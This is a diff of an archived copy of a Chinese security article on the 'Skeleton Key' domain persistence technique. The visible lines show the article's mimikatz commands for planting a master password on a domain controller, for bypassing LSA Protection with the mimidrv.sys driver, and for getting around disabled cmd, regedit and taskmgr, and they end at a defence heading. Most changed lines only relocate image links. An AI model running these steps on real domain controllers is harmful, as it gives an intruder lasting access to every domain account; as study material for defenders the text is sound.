@@ -3,7 +3,7 @@
 			<head>
 			     <title>域渗透——Skeleton Key - 三好学生</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/12670">http://drops.wooyun.org/tips/12670</a></h1>
 				
@@ -14,7 +14,7 @@
 
 <p>上篇介绍了利用SSP来维持域控权限，美中不足在于其需要域控重启才能生效，而在众多的域渗透方法中，当然存在不需要域控重启即能生效的方法，所以这次就介绍其中的一个方法——Skeleton Key</p>
 
-<p><img src="http://static.wooyun.org//drops/20160226/2016022606135645700130.jpg" alt="Alt text"></p>
+<p><img src="../images_result/images/2016022606135645700130.jpg" alt="Alt text"></p>
 
 <!--more-->
 
@@ -56,7 +56,7 @@ net use \\WIN-8VVLRPIAJB0.test.local 12345678!Q /user:<a class="__cf_email__" hr
 dir \\WIN-8VVLRPIAJB0.test.local\c$
 </code></pre>
 
-<p>如图 <img src="http://static.wooyun.org//drops/20160226/2016022606135871933278.png" alt="Alt text"></p>
+<p>如图 <img src="../images_result/images/2016022606135871933278.png" alt="Alt text"></p>
 
 <h3>2、在域控安装Skeleton Key</h3>
 
@@ -67,7 +67,7 @@ privilege::debug
 misc::skeleton
 </code></pre>
 
-<p>如图 <img src="http://static.wooyun.org//drops/20160226/2016022606135966399349.png" alt="Alt text"></p>
+<p>如图 <img src="../images_result/images/2016022606135966399349.png" alt="Alt text"></p>
 
 <p><strong>注：</strong><br>
 64系统需要使用64位的mimikatz</p>
@@ -82,7 +82,7 @@ misc::skeleton
 net use */del /y
 </code></pre>
 
-<p>如图 <img src="http://static.wooyun.org//drops/20160226/2016022606140164805445.png" alt="Alt text"></p>
+<p>如图 <img src="../images_result/images/2016022606140164805445.png" alt="Alt text"></p>
 
 <p><strong>（2）</strong>使用Skeleton Key登录</p>
 
@@ -95,7 +95,7 @@ net use \\WIN-8VVLRPIAJB0.test.local mimikatz /user:<a class="__cf_email__" href
 dir \\WIN-8VVLRPIAJB0.test.local\c$
 </code></pre>
 
-<p>如图 <img src="http://static.wooyun.org//drops/20160226/2016022606140376323538.png" alt="Alt text"></p>
+<p>如图 <img src="../images_result/images/2016022606140376323538.png" alt="Alt text"></p>
 
 <p><strong>（3）</strong>权限测试</p>
 
@@ -103,7 +103,7 @@ dir \\WIN-8VVLRPIAJB0.test.local\c$
 
 <p><strong>b、</strong>使用域内普通权限用户+Skeleton Key登录</p>
 
-<p>如图 <img src="http://static.wooyun.org//drops/20160226/2016022606140483069631.png" alt="Alt text"></p>
+<p>如图 <img src="../images_result/images/2016022606140483069631.png" alt="Alt text"></p>
 
 <p>发现使用域内不存在的用户无法登录</p>
 
@@ -128,11 +128,11 @@ Windows Server 2012 R2
 <p>注册表位置：<br>
 <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</code></p>
 
-<p>如图 <img src="http://static.wooyun.org//drops/20160226/2016022606140610447730.png" alt="Alt text"></p>
+<p>如图 <img src="../images_result/images/2016022606140610447730.png" alt="Alt text"></p>
 
 <p>新建-<code>DWORD</code>值，名称为<code>RunAsPPL</code>,数值为<code>00000001</code></p>
 
-<p>如图 <img src="http://static.wooyun.org//drops/20160226/2016022606140713044827.png" alt="Alt text"></p>
+<p>如图 <img src="../images_result/images/2016022606140713044827.png" alt="Alt text"></p>
 
 <p>重启系统</p>
 
@@ -145,13 +145,13 @@ privilege::debug
 misc::skeleton
 </code></pre>
 
-<p>此时失败 <img src="http://static.wooyun.org//drops/20160226/2016022606140916330927.png" alt="Alt text"></p>
+<p>此时失败 <img src="../images_result/images/2016022606140916330927.png" alt="Alt text"></p>
 
 <p><strong>（3）</strong>绕过LSA Protection</p>
 
 <p>mimikatz早在2013年10月就已支持绕过LSA Protection</p>
 
-<p>如图 <img src="http://static.wooyun.org//drops/20160226/20160226061410196101028.png" alt="Alt text"></p>
+<p>如图 <img src="../images_result/images/20160226061410196101028.png" alt="Alt text"></p>
 
 <p><strong>参考源码：</strong><br>
 <a href="https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_kernel.c">https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl&#95;m&#95;kernel.c</a></p>
@@ -159,7 +159,7 @@ misc::skeleton
 <p><strong>注：</strong><br>
 该功能需要mimidrv.sys文件</p>
 
-<p><img src="http://static.wooyun.org//drops/20160226/20160226061411707861130.png" alt="Alt text"></p>
+<p><img src="../images_result/images/20160226061411707861130.png" alt="Alt text"></p>
 
 <p><strong>mimikatz命令：</strong></p>
 
@@ -172,7 +172,7 @@ misc::skeleton
 
 <p>如图，导入驱动文件mimidrv.sys后，绕过LSA Protection，操作成功</p>
 
-<p><img src="http://static.wooyun.org//drops/20160226/20160226061413622701224.png" alt="Alt text"></p>
+<p><img src="../images_result/images/20160226061413622701224.png" alt="Alt text"></p>
 
 <h1>0x03 补充</h1>
 
@@ -186,23 +186,23 @@ misc::skeleton
 
 <p>本地计算机测试-用户配置-管理模板-系统</p>
 
-<p>如图 <img src="http://static.wooyun.org//drops/20160226/20160226061415861991323.png" alt="Alt text"></p>
+<p>如图 <img src="../images_result/images/20160226061415861991323.png" alt="Alt text"></p>
 
 <p><strong>禁用cmd：</strong></p>
 
-<p>选择"阻止访问命令提示符"-启用 <img src="http://static.wooyun.org//drops/20160226/20160226061416263131419.png" alt="Alt text"></p>
+<p>选择"阻止访问命令提示符"-启用 <img src="../images_result/images/20160226061416263131419.png" alt="Alt text"></p>
 
 <p><strong>禁用regedit：</strong></p>
 
-<p>选择"阻止访问注册表编辑工具"-启用 <img src="http://static.wooyun.org//drops/20160226/20160226061417221121519.png" alt="Alt text"></p>
+<p>选择"阻止访问注册表编辑工具"-启用 <img src="../images_result/images/20160226061417221121519.png" alt="Alt text"></p>
 
 <p><strong>禁用taskmgr:</strong></p>
 
-<p>选择"不要运行指定的Windows应用程序"-不允许的应用程序列表-填入taskmgr.exe-启用 <img src="http://static.wooyun.org//drops/20160226/20160226061419945231617.png" alt="Alt text"></p>
+<p>选择"不要运行指定的Windows应用程序"-不允许的应用程序列表-填入taskmgr.exe-启用 <img src="../images_result/images/20160226061419945231617.png" alt="Alt text"></p>
 
 <p><strong>测试：</strong></p>
 
-<p><img src="http://static.wooyun.org//drops/20160226/20160226061421968601713.png" alt="Alt text"></p>
+<p><img src="../images_result/images/20160226061421968601713.png" alt="Alt text"></p>
 
 <p>如图cmd、regedit、taskmgr均已被禁用</p>
 
@@ -219,7 +219,7 @@ misc::taskmgr
 
 <p>如图，成功执行，绕过限制</p>
 
-<p><img src="http://static.wooyun.org//drops/20160226/20160226061422633071812.png" alt="Alt text"></p>
+<p><img src="../images_result/images/20160226061422633071812.png" alt="Alt text"></p>
 
 <h1>0x04 防御</h1>
 
